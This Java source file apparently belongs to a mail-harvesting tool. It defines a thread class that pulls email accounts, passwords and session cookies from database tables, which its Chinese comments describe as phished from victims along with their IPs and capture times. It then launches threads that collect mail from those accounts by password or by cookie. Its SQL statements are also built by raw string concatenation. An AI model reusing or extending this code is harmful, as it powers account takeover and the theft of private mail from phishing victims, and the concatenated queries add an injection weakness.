/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */

package email;

import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *  自定义线程类继承Thread，实现线程操作
 * @author ap.xEmailBox
 */
class ExecuteRecvThread extends Thread {

    private boolean runningFlag;                                                //线程运行状态
    private Object arg_id;                                                      //保存ID值
    private boolean recvType;                                                   //标识收邮类别
    private MailFuncInter m_mailFunc;                                           //定义接口实例
    /**
     * Begin User Recvive Thread
     * @param id
     */
    private void BeginUserRecviveThread(Object id)
    {
        int ID=-1;
        String accounts=null;                                                   //用户输入的邮箱帐户以及钓到的邮箱账户
        String password=null;                                                   //用户输入的邮箱密码以及钓到的邮箱密码
        String postfix=null;
        String userMessage=null;                                                //用户备注
        String logo=null;                                                       //用户收取邮箱的标示
        String Power=null;                                                      //属主
        int Pages=-1;                                                            //按页收取字段
        String FirstTime=null;                                                  //上次收取时间
        String LastTime=null;                                                   //最后一次收取时间
        String MailType=null;                                                   //邮箱类型
        int MailNumber=-1;                                                      //已经接收的邮件数量
        String IP=null;                                                         //钓到的IP
        String AddTime=null;                                                       //钓到的COOKIE及密码的时间
        int AutoRev=-1;                                                          //是否自动收取
        String TimeSpace=null;                                                    //间隔收取时间
        String DateRevLimit=null;                                               //按时间收取
        int RevLogo=-1;                                                         //收取次数状态标示
        int RevState=-1;                                                        //接收状态


        try
        {
            ResultSet result;
            String sql="select * from emailaccounts where ID='"+id+"'";
            result=m_mailFunc.ExcuteResult(sql);
            if(result.next())
            {
                ID=result.getInt("ID");
                accounts=result.getString("accounts");
                password=result.getString("password");
                postfix=result.getString("PostFix");
                userMessage=result.getString("userMessage");
                logo=result.getString("logo");
                Power=result.getString("Power");
                Pages=result.getInt("Pages");
                FirstTime=result.getString("FirstTime");
                LastTime=result.getString("LastTime");
                MailType=result.getString("MailType");
                MailNumber=result.getInt("MailNumber");
                IP=result.getString("IP");
                AddTime=result.getString("AddTime");
                AutoRev=result.getInt("AutoRev");
                TimeSpace=result.getString("TimeSpace");
                DateRevLimit=result.getString("DateRevLimit");
                RevLogo=result.getInt("RevLogo");
                RevState=result.getInt("RevState");

                //jTextInfo.setText(accounts+"\n");                             //测试内容
                BeginReceiveThread recviveThread=new BeginReceiveThread(ID,accounts,password,postfix,
								userMessage,logo,Power,Pages,FirstTime,LastTime,MailType,
								MailNumber,IP,AddTime,AutoRev,TimeSpace,DateRevLimit,
                                                                RevLogo,RevState, m_mailFunc );
						recviveThread.Execute();

            }

        } catch (SQLException ex) {
            Logger.getLogger(EmailView.class.getName()).log(Level.SEVERE, null, ex);
        }

    }
    /**
     * Begin Cookie Recvive Thread
     * @param id
     */
    private void BeginCookieRecviveThread(Object id)
    {
        int ID=-1;
        String user=null;                                                       //用户输入的邮箱帐户以及钓到的邮箱账户
        String cookie=null;                                                     //cookie信息
        String ip=null;                                                          //ip
        String date=null;                                                       //cookie添加时间
        String browser=null;                                                      //浏览器信息
        String logo=null;                                                       //操作人员
        int RevLogo=-1;                                                         //收取次数状态标示
        String MailType=null;
        String url=null;


        try
        {
            ResultSet result;
            String sql="select * from emailcookies where ID='"+id+"'";
            result=m_mailFunc.ExcuteResult(sql);
            if(result.next())
            {
                ID=result.getInt("ID");
                user=result.getString("user");
                cookie=result.getString("cookie");
                ip=result.getString("IP");
                date=result.getString("Date");
                browser=result.getString("Browser");
                RevLogo=result.getInt("RevLogo");
                MailType=result.getString("MailType");
                url=result.getString("url");
                //jTextInfo.setText(accounts+"\n");                             //测试内容
                BeginReceiveThread recviveThread=new BeginReceiveThread(ID,user,cookie,url,
								ip,date,browser,RevLogo,MailType, m_mailFunc );
						recviveThread.Execute();

            }

        } catch (SQLException ex) {
            Logger.getLogger(EmailView.class.getName()).log(Level.SEVERE, null, ex);
        }

    }
    /**
     * 返回线程的运行状态
     * @return
     */
    public boolean isRunning()
    {
         return runningFlag;
    }
    /**
     * 当flag为true是即唤醒一个线程，让他执行用户的操作
     * @param flag
     */
    public synchronized void setRunning(boolean flag)
    {
        runningFlag=flag;
        if(runningFlag)
        {
            this.notify();                                                      //唤醒线程
        }
    }
    /**
     * 取得参数的值
     * @return
     */
    public Object getArgument()
    {
        return this.arg_id;
    }
    /**
     * 设置参数的值
     * @param strarg        表示数据表中主键ID的值
     * @param recvtype      表明收邮的类别，即密码收邮还是cookie收邮
     */
    public void setArgument(Object strarg,boolean recvtype)
    {
        arg_id=strarg;
        recvType=recvtype;
    }
    /**
     * 开启所有线程
     * @param threadNumber  为测试数据，本程序中并无作用，可以去掉此参数
     * @param mailfunc
     */
    public ExecuteRecvThread(int threadNumber,MailFuncInter mailfunc)
    {
        m_mailFunc=mailfunc;
        runningFlag=false;                                                      //开线程，并告诉线程所处于的状态，false即为让线程处于睡眠状态
    }
    /**
     * 继承Thread中的run函数并重写
     */
    @Override
    public synchronized void run()
    {
        try 
        {
            while(true)
            {
                if(!runningFlag)
                {
                    this.wait();                                                //让线程持续处于睡眠状态
                }
                else
                {
                    if(recvType)
                    {
                        //开始密码收邮
                        BeginUserRecviveThread(arg_id);                         //用一个线程池管理密码收邮及cookie收邮，所以此处只传一个ID参数，
                                                                                //两个表都有ID属性，并且都主主键，如果换成别的参数即要对线程池中线程激活
                    }                                                           //函数BeginRecThread进行修改
                    else
                    {
                        //开始cookie收邮
                        BeginCookieRecviveThread(arg_id);
                    }
                    sleep(3000);                                                //线程执行完成后休眠3秒钟
                    setRunning(false);                                          //让线程继续等待用户的操作
                }
           }
       }
        catch (InterruptedException ex)
        {
            Logger.getLogger(ExecuteRecvThread.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    /**
     * 停止单个线程
     * @param arg 要停止的线程所对应的ID
     * @param recvType 表明
     */
    public void setAbort(Object arg,boolean recvType)
    {
        int recvstate;
       // State s=this.getState();
       // System.out.print(s);
        if(recvType)
        {

            if(m_mailFunc.GetThreadmark())
            {
                 recvstate=1;
            }
            else
            {
                 recvstate=0;
            }
            String sql="update  emailaccounts set RevState='"+recvstate+"' where ID='"+arg+"'";
            if(1==m_mailFunc.Excutemdl(sql))
            {
                m_mailFunc.ShowMessage("正在停止线程....");
            }
            else
            {
                m_mailFunc.ShowMessage("停止线程失败....");
            }
        }
        else
        {
            if(m_mailFunc.GetThreadmark())
            {
                 recvstate=1;
            }
            else
            {
                 recvstate=0;
            }
            String sql="update  emailcookies set RevState='"+recvstate+"' where ID='"+arg+"'";
            if(1==m_mailFunc.Excutemdl(sql))
            {
                m_mailFunc.ShowMessage("正在停止线程....");
            }
            else
            {
                m_mailFunc.ShowMessage("停止线程失败....");
            }
        }
    }

    void setAllAbort(Object arg, boolean recvType)
    {
        int recvstate;
        if(recvType)
        {
            m_mailFunc.SetuserAllThreadMark(false);
            m_mailFunc.ShowMessage("开始停止线程...");

            
        }
        else
        {
            m_mailFunc.SetcookieAllThreadMark(false);
            m_mailFunc.ShowMessage("开始停止线程...");
        }

    }
     

}
